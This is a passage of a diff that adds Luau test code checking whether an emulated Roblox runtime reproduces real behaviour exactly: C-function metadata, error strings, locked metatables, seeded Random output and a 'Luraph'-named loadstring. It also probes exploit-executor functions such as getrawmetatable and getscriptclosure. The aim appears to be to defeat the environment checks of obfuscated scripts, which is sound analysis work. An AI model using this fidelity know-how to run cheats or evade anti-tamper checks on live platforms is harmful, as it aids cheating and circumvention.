+        resetmemorycategory = true, profileend = true,
+        desynchronize = true, synchronize = true,
+    }
+    for _, scan in ipairs(t1) do
+        local source = t2[scan.name]
+        local previous = nil
+        for i, keyName in ipairs(scan.keys) do
+            local key, value = next(source, previous)
+            check(key ~= nil,
+                "library-status:" .. scan.name .. ":" .. i)
+            if t3[keyName] then
+                check(key == keyName,
+                    "library-key:" .. keyName)
+            end
+
+            check(value ~= nil,
+                "library-value:" .. scan.name .. ":" .. i)
+            previous = key
+        end
+    end
+
+    local readonly = table.freeze({})
+    for i = 1, 5 do
+        local ok, err = pcall(function()
+            readonly[i] = i
+        end)
+        checkErrorSuffix(ok, err,
+            "attempt to modify a readonly table",
+            "readonly:" .. i)
+    end
+    local nilCallable = nil
+    local nilOk, nilDiagnostic = pcall(function(...)
+        return nilCallable(...)
+    end)
+    checkErrorSuffix(nilOk, nilDiagnostic,
+        "attempt to call a nil value", "nil-call")
+
+    local dataModel = game
+    local workspaceObject = workspace
+    local httpService = game:GetService("HttpService")
+    local runService = game:GetService("RunService")
+    local folderParent = Instance.new("Folder")
+    local folderChild = Instance.new("Folder", folderParent)
+    local objects = {
+        { value = dataModel, class = "DataModel" },
+        { value = workspaceObject, class = "Workspace" },
+        { value = folderParent, class = "Folder" },
+        { value = folderChild, class = "Folder" },
+        { value = httpService, class = "HttpService" },
+        { value = runService, class = "RunService" },
+    }
+    local signals = {}
+    local connections = {}
+    for i, record in ipairs(objects) do
+        local object = record.value
+        local firstName = object.Name
+        check(type(object) == "userdata",
+            "Instance:type:" .. record.class)
+        check(typeof(object) == "Instance",
+            "Instance:typeof:" .. record.class)
+        check(type(firstName) == "string",
+            "Instance:Name-type:" .. record.class)
+        check(object.Name == firstName,
+            "Instance:Name-relation:" .. record.class)
+        check(object.ClassName == record.class,
+            "Instance:ClassName:" .. record.class)
+        check(
+            getmetatable(object) == "The metatable is locked",
+            "Instance:metatable:" .. record.class
+        )
+        local attributeChanged = object.AttributeChanged
+        local childRemoved = object.ChildRemoved
+        check(attributeChanged ~= nil,
+            "Instance:AttributeChanged:" .. record.class)
+        check(childRemoved ~= nil,
+            "Instance:ChildRemoved:" .. record.class)
+        signals[#signals + 1] = attributeChanged
+        signals[#signals + 1] = childRemoved
+        local connection = childRemoved:Connect(function() end)
+        check(connection.Connected == true,
+            "Connection:Connected:" .. i)
+        connections[#connections + 1] = connection
+    end
+
+    local enumType = Enum.HumanoidRigType
+    local enumItem = enumType.R6
+    local rng = Random.new(51018400)
+
+    local t4 = { "getmetatable", "setmetatable", "tonumber", "tostring", "rawset", "rawget", "select", "xpcall", "assert", "error", "pcall", "type", "next", "getfenv", "setfenv", "typeof", "gmatch", "format", "match", "find", "char", "byte", "gsub", "sub", "rep", "unpack", "pack", "concat", "insert", "isyieldable", "running", "create", "status", "yield", "close", "resume", "wrap", "cancel", "spawn", "defer", "delay", "wait", "unpack", "info", "traceback", "loadstring", "new", "new", "new", "new", "new", "new", "Connect", "Connect", "Disconnect", "Connect", "Connect", "Disconnect", "Connect", "Connect", "Disconnect", "Connect", "Connect", "Disconnect", "WaitForChild", "Connect", "Connect", "Disconnect", "Connect", "Connect", "Disconnect", "IsStudio", "IsClient", "IsServer", "IsA", "FromName", "FromValue", "new", "NextUnitVector", "NextInteger", "NextNumber", "Shuffle", "Clone" }
+    local t5 = {
+        assert = assert, byte = string.byte,
+        cancel = task.cancel, char = string.char,
+        close = coroutine.close, concat = table.concat,
+        create = coroutine.create, defer = task.defer,
+        delay = task.delay, error = error,
+        find = string.find, format = string.format,
+        getfenv = getfenv, getmetatable = getmetatable,
+        gmatch = string.gmatch, gsub = string.gsub,
+        info = debug.info, insert = table.insert,
+        isyieldable = coroutine.isyieldable,
+        loadstring = loadstring, match = string.match,
+        next = next, pack = string.pack, pcall = pcall,
+        rawget = rawget, rawset = rawset,
+        rep = string.rep, resume = coroutine.resume,
+        running = coroutine.running, select = select,
+        setfenv = setfenv, setmetatable = setmetatable,
+        spawn = task.spawn, status = coroutine.status,
+        sub = string.sub, tonumber = tonumber,
+        tostring = tostring, traceback = debug.traceback,
+        type = type, typeof = typeof,
+        wait = task.wait, wrap = coroutine.wrap,
+        xpcall = xpcall, yield = coroutine.yield,
+    }
+    local t6 = {
+        Instance.new, UDim2.new, Path2DControlPoint.new,
+        Vector2.new, UDim.new, Rect.new, Random.new,
+    }
+    local t7 = {}
+    local t8 = {}
+    for i, name in ipairs(t4) do
+        local n = (t7[name] or 0) + 1
+        t7[name] = n
+        local fn
+        if name == "Connect" then
+            fn = signals[(n - 1) % #signals + 1].Connect
+        elseif name == "Disconnect" then
+            fn = connections[n].Disconnect
+        elseif name == "FromName" then
+            fn = enumType.FromName
+        elseif name == "FromValue" then
+            fn = enumType.FromValue
+        elseif name == "IsA" then
+            fn = enumItem.IsA
+        elseif name == "IsClient" then
+            fn = runService.IsClient
+        elseif name == "IsServer" then
+            fn = runService.IsServer
+        elseif name == "IsStudio" then
+            fn = runService.IsStudio
+        elseif name == "NextInteger" then
+            fn = rng.NextInteger
+        elseif name == "NextNumber" then
+            fn = rng.NextNumber
+        elseif name == "NextUnitVector" then
+            fn = rng.NextUnitVector
+        elseif name == "Shuffle" then
+            fn = rng.Shuffle
+        elseif name == "Clone" then
+            fn = rng.Clone
+        elseif name == "WaitForChild" then
+            fn = folderParent.WaitForChild
+        elseif name == "new" then
+            fn = t6[n]
+        elseif name == "unpack" then
+            fn = n == 1 and
+                string.unpack or table.unpack
+        else
+            fn = t5[name]
+        end
+        check(type(fn) == "function",
+            "n0:" .. i .. ":" .. name)
+        t8[i] = fn
+        local source, line, fnName, parameters,
+            variadic, v22 = debug.info(fn, "slnaf")
+        check(source == "[C]",
+            "n1:" .. i)
+        check(line == -1,
+            "n2:" .. i)
+        check(fnName == name,
+            "n3:" .. i)
+        check(parameters == 0,
+            "n4:" .. i)
+        check(variadic == true,
+            "n5:" .. i)
+        check(v22 == fn,
+            "n6:" .. i)
+        check(iscclosure(fn) == true,
+            "n7:" .. i)
+        check(islclosure(fn) == false,
+            "n8:" .. i)
+    end
+
+    local t9 = {
+        { name = "getfenv", expected = "invalid argument #1 to 'getfenv' (level must be non-negative)" },
+        { name = "setfenv", expected = "missing argument #2 to 'setfenv' (table expected)" },
+        { name = "getmetatable", expected = "missing argument #1" },
+        { name = "setmetatable", expected = "missing argument #1 to 'setmetatable' (table expected)" },
+        { name = "tonumber", expected = "missing argument #1" },
+        { name = "tostring", expected = "missing argument #1" },
+        { name = "rawset", expected = "missing argument #1 to 'rawset' (table expected)" },
+        { name = "rawget", expected = "missing argument #1 to 'rawget' (table expected)" },
+        { name = "assert", expected = "missing argument #1" },
+        { name = "type", expected = "missing argument #1" },
+        { name = "next", expected = "missing argument #1 to 'next' (table expected)" },
+        { name = "typeof", expected = "missing argument #1" },
+        { name = "gmatch", expected = "missing argument #1 to 'gmatch' (string expected)" },
+        { name = "format", expected = "missing argument #1 to 'format' (string expected)" },
+        { name = "match", expected = "missing argument #1 to 'match' (string expected)" },
+        { name = "find", expected = "missing argument #1 to 'find' (string expected)" },
+        { name = "byte", expected = "missing argument #1 to 'byte' (string expected)" },
+        { name = "gsub", expected = "missing argument #1 to 'gsub' (string expected)" },
+        { name = "gsub", expected = "missing argument #1 to 'gsub' (string expected)" },
+        { name = "rep", expected = "missing argument #1 to 'rep' (string expected)" },
+        { name = "char", expected = "invalid argument #1 to 'char' (number expected, got nil)" },
+        { name = "unpack", expected = "missing argument #1 to 'unpack' (string expected)" },
+        { name = "pack", expected = "missing argument #1 to 'pack' (string expected)" },
+        { name = "concat", expected = "missing argument #1 to 'concat' (table expected)" },
+        { name = "insert", expected = "missing argument #1 to 'insert' (table expected)" },
+        { name = "create", expected = "missing argument #1 to 'create' (function expected)" },
+        { name = "status", expected = "missing argument #1 to 'status' (thread expected)" },
+        { name = "close", expected = "missing argument #1 to 'close' (thread expected)" },
+        { name = "resume", expected = "missing argument #1 to 'resume' (thread expected)" },
+        { name = "wrap", expected = "missing argument #1 to 'wrap' (function expected)" },
+        { name = "cancel", expected = "missing argument #1 to 'cancel' (thread expected)" },
+        { name = "spawn", expected = "invalid argument #1 to 'spawn' (function or thread expected)" },
+        { name = "defer", expected = "invalid argument #1 to 'defer' (function or thread expected)" },
+        { name = "delay", expected = "invalid argument #2 to 'delay' (function or thread expected)" },
+        { name = "wait", expected = "invalid argument #1 to 'wait' (number expected, got table)" },
+        { name = "unpack", expected = "missing argument #1 to 'unpack' (table expected)" },
+        { name = "info", expected = "invalid argument #1 to 'info' (function or level expected)" },
+        { name = "loadstring", expected = "missing argument #1 to 'loadstring' (string expected)" },
+        { name = "new", expected = "invalid argument #1 to 'new' (string expected, got nil)" },
+        { name = "new", expected = "invalid argument #1 to 'new' (UDim2 expected, got nil)", relaxedTypePrefix = true },
+        { name = "Disconnect", expected = "invalid argument #1 to 'Disconnect' (RBXScriptConnection expected, got nil)" },
+        { name = "Disconnect", expected = "invalid argument #1 to 'Disconnect' (RBXScriptConnection expected, got nil)" },
+        { name = "Disconnect", expected = "invalid argument #1 to 'Disconnect' (RBXScriptConnection expected, got nil)" },
+        { name = "Disconnect", expected = "invalid argument #1 to 'Disconnect' (RBXScriptConnection expected, got nil)" },
+        { name = "WaitForChild", expected = "Expected ':' not '.' calling member function WaitForChild" },
+        { name = "Disconnect", expected = "invalid argument #1 to 'Disconnect' (RBXScriptConnection expected, got nil)" },
+        { name = "Disconnect", expected = "invalid argument #1 to 'Disconnect' (RBXScriptConnection expected, got nil)" },
+        { name = "IsStudio", expected = "Expected ':' not '.' calling member function IsStudio" },
+        { name = "IsClient", expected = "Expected ':' not '.' calling member function IsClient" },
+        { name = "IsServer", expected = "Expected ':' not '.' calling member function IsServer" },
+        { name = "IsA", expected = "missing argument #1 to 'IsA' (EnumItem expected)" },
+        { name = "FromName", expected = "missing argument #1 to 'FromName' (Enum expected)" },
+        { name = "FromValue", expected = "missing argument #1 to 'FromValue' (Enum expected)" },
+        { name = "new", expected = "invalid argument #1 to 'new' (number expected, got table)" },
+    }
+    local t10 = {}
+    local t11 = {
+        getfenv = getfenv, setfenv = setfenv,
+        getmetatable = getmetatable,
+        setmetatable = setmetatable, tonumber = tonumber,
+        tostring = tostring, rawset = rawset,
+        rawget = rawget, assert = assert, type = type,
+        next = next, typeof = typeof,
+        gmatch = string.gmatch, format = string.format,
+        match = string.match, find = string.find,
+        byte = string.byte, gsub = string.gsub,
+        rep = string.rep, char = string.char,
+        concat = table.concat, insert = table.insert,
+        create = coroutine.create,
+        status = coroutine.status, close = coroutine.close,
+        resume = coroutine.resume, wrap = coroutine.wrap,
+        cancel = task.cancel, spawn = task.spawn,
+        defer = task.defer, delay = task.delay,
+        wait = task.wait, info = debug.info,
+        loadstring = loadstring,
+    }
+    local t12 = {
+        Instance.new, Path2DControlPoint.new, Random.new,
+    }
+    local n2 = 0
+
+    local function f11(callback)
+        local function layer4()
+            local a, b = callback()
+            return a, b
+        end
+        local function layer3()
+            local a, b = layer4()
+            return a, b
+        end
+        local function layer2()
+            local a, b = layer3()
+            return a, b
+        end
+        local function layer1()
+            local a, b = layer2()
+            return a, b
+        end
+        return layer1()
+    end
+
+    local function callInvalid(name, n, fn)
+        if name == "getfenv" then
+            return fn(-1)
+        elseif name == "setfenv" then
+            return fn(0)
+        elseif name == "char" then
+            return fn(nil)
+        elseif name == "wait" then
+            return fn({})
+        elseif name == "new" then
+            if n < 3 then
+                return fn(nil)
+            end
+            return fn({})
+        elseif name == "Disconnect" then
+            return fn(nil)
+        end
+        return fn()
+    end
+
+    for i, entry in ipairs(t9) do
+        local n =
+            (t10[entry.name] or 0) + 1
+        t10[entry.name] = n
+        local fn
+        if entry.name == "unpack" then
+            fn = n == 1 and
+                string.unpack or table.unpack
+        elseif entry.name == "pack" then
+            fn = string.pack
+        elseif entry.name == "new" then
+            fn = t12[n]
+        elseif entry.name == "Disconnect" then
+            n2 += 1
+            fn = connections[n2].Disconnect
+        elseif entry.name == "WaitForChild" then
+            fn = folderParent.WaitForChild
+        elseif entry.name == "IsStudio" then
+            fn = runService.IsStudio
+        elseif entry.name == "IsClient" then
+            fn = runService.IsClient
+        elseif entry.name == "IsServer" then
+            fn = runService.IsServer
+        elseif entry.name == "IsA" then
+            fn = enumItem.IsA
+        elseif entry.name == "FromName" then
+            fn = enumType.FromName
+        elseif entry.name == "FromValue" then
+            fn = enumType.FromValue
+        else
+            fn = t11[entry.name]
+        end
+        local t13 = {}
+        local ok, err = f11(function()
+            return xpcall(function()
+                return callInvalid(
+                    entry.name, n, fn
+                )
+            end, function(err2)
+                for _, level in ipairs({ 5, 6, 7, 8, 10, 11 }) do
+                    t13[level] = debug.info(level, "f")
+                end
+                return err2
+            end)
+        end)
+        for _, level in ipairs({ 5, 6, 7, 8, 10, 11 }) do
+            check(t13[level] ~= nil,
+                "stack-level:" .. i .. ":" .. level)
+        end
+        if entry.relaxedTypePrefix then
+            check(ok == false,
+                "n9:" .. i .. ":" .. entry.name .. ":status")
+            check(type(err) == "string" and
+                string.find(err, "UDim2 expected, got nil", 1, true) ~= nil,
+                "n9:" .. i .. ":" .. entry.name .. ":error")
+        else
+            checkErrorSuffix(ok, err, entry.expected,
+                "n9:" .. i .. ":" .. entry.name)
+        end
+    end
+
+    for i, connection in ipairs(connections) do
+        check(connection.Connected == true,
+            "connection-before-disconnect:" .. i)
+        local ok, err = pcall(connection.Disconnect, nil)
+        checkError(ok, err,
+            "invalid argument #1 to 'Disconnect' " ..
+            "(RBXScriptConnection expected, got nil)",
+            "Disconnect:nil:" .. i)
+        connection:Disconnect()
+        check(connection.Connected == false,
+            "connection-after-disconnect:" .. i)
+    end
+
+
+    local childrenOk, childrenDiagnostic =
+        pcall(dataModel.GetChildren, nil)
+    checkError(childrenOk, childrenDiagnostic,
+        "Expected ':' not '.' calling member function GetChildren",
+        "DataModel:GetChildren-dot")
+    for _, method in ipairs({
+        runService.IsStudio, runService.IsClient,
+        runService.IsServer,
+    }) do
+        local ok = pcall(method, nil)
+        check(ok == false, "RunService:dot-call")
+    end
+    check(type(runService:IsServer()) == "boolean",
+        "RunService:IsServer-result")
+
+    check(#folderParent:GetChildren() == 1,
+        "Folder:GetChildren")
+    folderChild.Name = "847283502"
+    check(
+        folderParent:WaitForChild("847283502") == folderChild,
+        "f:id"
+    )
+    local waitOk, waitDiagnostic =
+        pcall(folderParent.WaitForChild, nil)
+    checkError(waitOk, waitDiagnostic,
+        "Expected ':' not '.' calling member function WaitForChild",
+        "Folder:WaitForChild-dot")
+    folderParent:Destroy()
+    folderChild:Destroy()
+    local parentOk, parentDiagnostic = pcall(function()
+        folderChild.Parent = folderParent
+    end)
+    check(parentOk == false,
+        "Folder:destroyed-parent-status")
+    check(string.find(parentDiagnostic,
+        "The Parent property of 847283502 is locked",
+        1, true) ~= nil, "Folder:destroyed-parent-error")
+
+    check(type(Enum) == "userdata", "Enum:type")
+    check(typeof(Enum) == "Enums", "Enum:typeof")
+    check(getmetatable(Enum) ==
+        "The metatable is locked", "Enum:metatable")
+    local byName1 = enumType:FromName("R6")
+    local byName2 = enumType:FromName("R6")
+    local byValue1 = enumType:FromValue(0)
+    local byValue2 = enumType:FromValue(0)
+    local byValue3 = enumType:FromValue(0)
+    check(byName1 == byName2, "Enum:FromName")
+    check(byName1 == byValue1, "e:id")
+    check(byValue1 == byValue2 and
+        byValue2 == byValue3, "Enum:FromValue")
+    check(enumType.R6 == byName1, "Enum:R6")
+    check(byName1.Name == "R6", "EnumItem:Name")
+    check(byName1.Value == 0, "EnumItem:Value")
+    check(byName1.EnumType == enumType,
+        "EnumItem:EnumType")
+    check(type(byName1) == "userdata" and
+        typeof(byName1) == "EnumItem", "EnumItem:classification")
+    check(type(enumType) == "userdata" and
+        typeof(enumType) == "Enum", "EnumType:classification")
+    check(getmetatable(byName1) ==
+        "The metatable is locked", "EnumItem:metatable")
+    check(getmetatable(enumType) ==
+        "The metatable is locked", "EnumType:metatable")
+
+    for _, method in ipairs({
+        "NextUnitVector", "NextInteger", "NextNumber",
+        "Shuffle", "Clone",
+    }) do
+        check(type(rng[method]) == "function",
+            "Random:method:" .. method)
+    end
+    local t14 = { original = Random.new(177465824) }
+    local v1 = t14["original"]:NextNumber()
+    check(v1 == 0.9598971928030796,
+        "Random:NextNumber:1")
+    local v2 = t14["original"]:NextInteger(189, 1164)
+    check(v2 == 889,
+        "Random:NextInteger:2")
+    local v3 = t14["original"]:NextNumber()
+    check(v3 == 0.027539190730015265,
+        "Random:NextNumber:3")
+    local v4 = t14["original"]:NextNumber()
+    check(v4 == 0.3377740061710911,
+        "Random:NextNumber:4")
+    local v5 = t14["original"]:NextInteger(75, 497)
+    check(v5 == 340,
+        "Random:NextInteger:5")
+    local v6 = t14["original"]:Clone()
+    check(v6 ~= nil,
+        "Random:Clone:6")
+    t14["clone1"] = v6
+    local v7 = t14["original"]:NextInteger(979, 1379)
+    check(v7 == 1338,
+        "Random:NextInteger:7")
+    local v8 = t14["clone1"]:NextNumber()
+    check(v8 == 0.010722157288309652,
+        "Random:NextNumber:8")
+    local v9 = t14["original"]:Clone()
+    check(v9 ~= nil,
+        "Random:Clone:9")
+    t14["clone2"] = v9
+    local v10 = t14["clone2"]:NextNumber()
+    check(v10 == 0.9163096810250362,
+        "Random:NextNumber:10")
+    local v11 = t14["clone2"]:NextNumber()
+    check(v11 == 0.7297156848095374,
+        "Random:NextNumber:11")
+    local v12 = t14["clone2"]:Clone()
+    check(v12 ~= nil,
+        "Random:Clone:12")
+    t14["clone3"] = v12
+    local v13 = t14["clone3"]:NextNumber()
+    check(v13 == 0.17877278448733477,
+        "Random:NextNumber:13")
+    local v14 = t14["clone3"]:NextInteger(35, 888)
+    check(v14 == 665,
+        "Random:NextInteger:14")
+    local v15 = t14["clone2"]:NextNumber()
+    check(v15 == 0.17877278448733477,
+        "Random:NextNumber:15")
+    local v16 = t14["clone2"]:NextInteger(721, 807)
+    check(v16 == 785,
+        "Random:NextInteger:16")
+    local v17 = t14["clone3"]:NextInteger(353, 1335)
+    check(v17 == 826,
+        "Random:NextInteger:17")
+
+    local function fromHex(hex)
+        local value = string.gsub(hex, "..", function(byte)
+            return string.char(tonumber(byte, 16))
+        end)
+        return value
+    end
+    local function toHex(value)
+        local hex = string.gsub(value, ".", function(byte)
+            return string.format("%02x", string.byte(byte))
+        end)
+        return hex
+    end
+    local nfc = utf8.nfcnormalize(fromHex(
+        "e1848fe185a9e186ade18492e185a2e186a9" ..
+        "e18486e185a8e18481e185a2e186ba" ..
+        "e18492e185a4e186b5"
+    ))
+    local nfd = utf8.nfdnormalize(fromHex(
+        "eabf94ebbdb0eb9ebaeb91b3ebb9a3eb9a89"
+    ))
+    check(#nfc == 15 and toHex(nfc) ==
+        "ecbd9aed95b6ebaa8ceab9bbed96ba", "Unicode:NFC")
+    check(#nfd == 51 and toHex(nfd) ==
+        "e18481e185afe18488e185aae186bbe18485e185a3e186ad" ..
+        "e18483e185afe186aee18488e185a1e186aae18484e185ad" ..
+        "e186b0", "Unicode:NFD")
+
+    local function nearlyEqual(actual, expected)
+        return math.abs(actual - expected) <= 0.000001
+    end
+    local function checkUDim2(value, expected, label)
+        check(nearlyEqual(value.X.Scale, expected[1]), label .. ":XS")
+        check(nearlyEqual(value.X.Offset, expected[2]), label .. ":XO")
+        check(nearlyEqual(value.Y.Scale, expected[3]), label .. ":YS")
+        check(nearlyEqual(value.Y.Offset, expected[4]), label .. ":YO")
+    end
+    local function checkVector2(value, expected, label)
+        check(nearlyEqual(value.X, expected[1]), label .. ":X")
+        check(nearlyEqual(value.Y, expected[2]), label .. ":Y")
+    end
+    local screenGui = Instance.new("ScreenGui")
+    local frame = Instance.new("Frame")
+    frame.Parent = screenGui
+    frame.Position = UDim2.new(0, 0, 0, 0)
+    frame.Size = UDim2.new(0, 130, 0, 231)
+    local path = Instance.new("Path2D")
+    path.Parent = frame
+    path:SetControlPoints({
+        Path2DControlPoint.new(UDim2.new(0, 3, 0, 8),
+            UDim2.new(0, 0, 0, 0), UDim2.new(0, 0, 0, 0)),
+        Path2DControlPoint.new(UDim2.new(0.5, 0, 0.125, -9),
+            UDim2.new(0, 2, 0.0625, 7),
+            UDim2.new(0, 6, 0, -5)),
+        Path2DControlPoint.new(UDim2.new(0.3125, -6, 0, -4),
+            UDim2.new(-0.125, -4, 0, 6),
+            UDim2.new(0, 0, 0, 0)),
+    })
+    check(nearlyEqual(path:GetLength(), 119.61338806152344),
+        "Path2D:length")
+    checkUDim2(path:GetPositionOnCurve(0.857142866),
+        { 0.2526211142539978, 0, 0.01074677798897028, 0 },
+        "Path2D:p1")
+    checkUDim2(path:GetPositionOnCurve(0.600000024),
+        { 0.47846919298171997, 0, 0.06947184354066849, 0 },
+        "Path2D:p2")
+    checkUDim2(path:GetPositionOnCurve(0.3125),
+        { 0.44014424085617065, 0, 0.12231127917766571, 0 },
+        "Path2D:p3")
+    checkVector2(path:GetTangentOnCurve(0.888888896),
+        { -21.083309173583984, -24.98147964477539 },
+        "Path2D:t1")
+    checkVector2(path:GetTangentOnCurve(0.800000012),
+        { -56.790000915527344, -27.420000076293945 },
+        "Path2D:t2")
+    checkVector2(path:GetTangentOnCurve(0.13333334),
+        { 92.80000305175781, 37.42499923706055 },
+        "Path2D:t3")
+    checkVector2(path:GetTangentOnCurve(0.571428597),
+        { -27.137767791748047, -20.846940994262695 },
+        "Path2D:t4")
+    checkUDim2(path:GetPositionOnCurveArcLength(0.5),
+        { 0.4516785144805908, 0, 0.12175357341766357, 0 },
+        "Path2D:ap1")
+    checkUDim2(path:GetPositionOnCurveArcLength(0.200000003),
+        { 0.1884470134973526, 0, 0.0800270289182663, 0 },
+        "Path2D:ap2")
+    checkVector2(path:GetTangentOnCurveArcLength(0.5),
+        { 40.919342041015625, -5.61236572265625 },
+        "Path2D:at1")
+    checkVector2(path:GetTangentOnCurveArcLength(0.800000012),
+        { -65.67493438720703, -27.52351188659668 },
+        "Path2D:at2")
+    screenGui:Destroy()
+
+    local co0 = coroutine.create(function()
+        for i = 1, 106 do
+            coroutine.yield(true, i)
+        end
+    end)
+    for i = 1, 106 do
+        local ok, status, value = coroutine.resume(co0)
+        check(ok and status == true and value == i,
+            "yield:iterator:" .. i)
+    end
+    check(coroutine.resume(co0) == true,
+        "yield:iterator-return")
+    coroutine.close(co0)
+    for i = 1, 3 do
+        local co2 = coroutine.create(function()
+            coroutine.yield(i)
+        end)
+        local ok, value = coroutine.resume(co2)
+        check(ok and value == i,
+            "yield:w:" .. i)
+        coroutine.close(co2)
+    end
+    local co1 = coroutine.running()
+    check(type(co1) == "thread",
+        "coroutine:running")
+    local co3 = task.spawn(function()
+        coroutine.yield()
+    end)
+    check(type(co3) == "thread",
+        "task:spawn-result")
+    coroutine.close(co3)
+    local co4 = task.delay(86400, function() end)
+    check(type(co4) == "thread",
+        "task:delay-result")
+    task.cancel(co4)
+    local v19 = task.spawn(function() end)
+    check(type(v19) == "thread",
+        "task:final-spawn-result")
+
+    local s3 =
+        "return setfenv(function(...) return UGiZrsFzK(...) end, " ..
+        "setmetatable({ UGiZrsFzK = ... }, { __index = getfenv((...)) }))"
+    local ok4, v20 =
+        pcall(loadstring, s3, "Luraph", nil)
+    check(ok4, "compile:status")
+    check(type(v20) == "function",
+        "compile:result")
+
+    runChecks()
+    print("")
+
+end
+
+local failures = {}
+local passed = 0
+
+local function fail(message)
+    error(tostring(message), 0)
+end
+
+local function expect(condition, message)
+    if not condition then
+        fail(message)
+    end
+end
+
+local function exact(label, actual, expected)
+    if actual ~= expected then
+        fail(string.format("%s: expected %.17g, got %.17g", label, expected, actual))
+    end
+end
+
+local function exactUDim2(label, actual, xScale, xOffset, yScale, yOffset)
+    exact(label .. ".X.Scale", actual.X.Scale, xScale)
+    exact(label .. ".X.Offset", actual.X.Offset, xOffset)
+    exact(label .. ".Y.Scale", actual.Y.Scale, yScale)
+    exact(label .. ".Y.Offset", actual.Y.Offset, yOffset)
+end
+
+local function exactVector2(label, actual, x, y)
+    exact(label .. ".X", actual.X, x)
+    exact(label .. ".Y", actual.Y, y)
+end
+
+local function check(name, callback)
+    local ok, result = xpcall(callback, function(message)
+        return tostring(message)
+    end)
+
+    if ok then
+        passed += 1
+    else
+        table.insert(failures, name .. ": " .. result)
+    end
+end
+
+local function checkCMetadata(label, callback, expectedName)
+    local source, line, name, argumentCount, isVariadic, identity = debug.info(callback, "slnaf")
+    expect(source == "[C]", label .. " source was " .. tostring(source))
+    expect(line == -1, label .. " line was " .. tostring(line))
+    expect(name == expectedName, label .. " name was " .. tostring(name))
+    expect(argumentCount == 0, label .. " argument count was " .. tostring(argumentCount))
+    expect(isVariadic == true, label .. " was not variadic")
+    expect(rawequal(identity, callback), label .. " function identity changed")
+end
+
+check("core globals", function()
+    expect(type(game) == "userdata", "game is not userdata")
+    expect(type(workspace) == "userdata", "workspace is not userdata")
+    expect(rawequal(game:GetService("Workspace"), workspace), "Workspace identity split")
+    expect(type(Instance) == "table" and type(Instance.new) == "function", "Instance.new missing")
+    expect(type(task) == "table", "task missing")
+    expect(type(buffer) == "table", "buffer missing")
+    expect(type(debug) == "table" and type(debug.info) == "function", "debug.info missing")
+end)
+
+check("loader language semantics", function()
+    for _, callback in {
+        assert, error, getmetatable, ipairs, next, pairs, pcall, rawequal, rawget, rawset, select, setmetatable,
+        tonumber, tostring, type, typeof, xpcall,
+    } do
+        expect(type(callback) == "function", "core callback missing")
+    end
+    for _, name in { "create", "pack", "unpack", "move", "freeze", "isfrozen", "clear", "clone" } do
+        expect(type(table[name]) == "function", "table." .. name .. " missing")
+    end
+    for _, name in { "byte", "char", "find", "format", "gmatch", "gsub", "len", "lower", "match", "rep", "reverse", "sub", "upper" } do
+        expect(type(string[name]) == "function", "string." .. name .. " missing")
+    end
+    for _, name in { "band", "bnot", "bor", "bxor", "lshift", "rshift", "arshift", "extract", "replace" } do
+        expect(type(bit32[name]) == "function", "bit32." .. name .. " missing")
+    end
+
+    local protected, first, second, third = pcall(function()
+        return 17, nil, 29
+    end)
+    expect(protected and first == 17 and second == nil and third == 29, "pcall return pack mismatch")
+    local xprotected, transformed = xpcall(function()
+        error("anti-env-sentinel", 0)
+    end, function(message)
+        return "caught:" .. tostring(message)
+    end)
+    expect(not xprotected and transformed == "caught:anti-env-sentinel", "xpcall handler mismatch")
+
+    local packed = table.pack("a", nil, "c")
+    expect(packed.n == 3 and packed[1] == "a" and packed[2] == nil and packed[3] == "c", "table.pack mismatch")
+    local created = table.create(3, 7)
+    expect(#created == 3 and created[1] == 7 and created[3] == 7, "table.create mismatch")
+    expect(not pcall(table.create, -1), "negative table.create did not fail")
+    local frozen = table.freeze({ marker = true })
+    expect(table.isfrozen(frozen), "table.freeze did not freeze")
+    expect(not pcall(function()
+        frozen.marker = false
+    end), "frozen table accepted a write")
+
+    local substituted, replacements = string.gsub("u-v-w", "[uvw]", { u = "1", v = "2", w = "3" })
+    expect(substituted == "1-2-3" and replacements == 3, "string.gsub table replacement mismatch")
+    expect(bit32.bxor(0x12345678, 0xFFFFFFFF) == 0xEDCBA987, "bit32 operation mismatch")
+    expect(rawequal(string.byte, ("A").byte), "primitive string method identity split")
+    expect(tostring({}) ~= tostring({}), "distinct tables share a tostring identity")
+end)
+
+check("constructor metadata", function()
+    checkCMetadata("UDim2.new", UDim2.new, "new")
+    checkCMetadata("Instance.new", Instance.new, "new")
+    checkCMetadata("Random.new", Random.new, "new")
+end)
+
+check("function environments", function()
+    expect(type(getfenv) == "function", "getfenv missing")
+    expect(type(setfenv) == "function", "setfenv missing")
+    local globalEnvironment = getfenv(UDim2.new)
+    expect(type(globalEnvironment) == "table", "C function environment missing")
+
+    local changedC = pcall(setfenv, UDim2.new, {})
+    expect(not changedC, "setfenv changed a C closure")
+
+    local function localClosure()
+        return true
+    end
+    local privateEnvironment = { marker = "private" }
+    setfenv(localClosure, privateEnvironment)
+    expect(rawequal(getfenv(localClosure), privateEnvironment), "Luau closure environment identity split")
+end)
+
+check("executor metatable boundary", function()
+    local environment = if type(getgenv) == "function" then getgenv() else getfenv(0)
+    local rawMetatable = rawget(environment, "getrawmetatable")
+    if type(rawMetatable) ~= "function" then
+        return
+    end
+
+    local metatable = rawMetatable(game)
+    expect(type(metatable) == "table", "game raw metatable missing")
+    expect(rawequal(metatable.__index(game, "Workspace"), workspace), "raw __index Workspace identity split")
+
+    local isCClosure = rawget(environment, "iscclosure")
+    if type(isCClosure) == "function" then
+        expect(isCClosure(metatable.__index), "game __index is not a C closure")
+        expect(isCClosure(metatable.__namecall), "game __namecall is not a C closure")
+    end
+
+    local getScriptClosure = rawget(environment, "getscriptclosure")
+    if type(getScriptClosure) == "function" then
+        local scriptObject = Instance.new("LocalScript")
+        local result = getScriptClosure(scriptObject)
+        scriptObject:Destroy()
+        expect(result == nil, "fresh LocalScript unexpectedly has a script closure")
+    end
+end)
+
+check("legacy scheduler surface", function()
+    local environment = if type(getgenv) == "function" then getgenv() else getfenv(0)
+    local legacyWait = rawget(environment, "wait")
+    local legacySpawn = rawget(environment, "spawn")
+    local legacyDelay = rawget(environment, "delay")
+    local legacyDefer = rawget(environment, "defer")
+
+    expect(type(legacyWait) == "function", "legacy wait missing")
+    expect(type(legacySpawn) == "function", "legacy spawn missing")
+    expect(type(legacyDelay) == "function", "legacy delay missing")
+    expect(legacyDefer == nil, "legacy defer should be absent")
+    expect(not rawequal(legacyWait, task.wait), "legacy wait aliases task.wait")
+    expect(not rawequal(legacySpawn, task.spawn), "legacy spawn aliases task.spawn")
+    expect(not rawequal(legacyDelay, task.delay), "legacy delay aliases task.delay")
+end)
+
+check("task closure metadata", function()
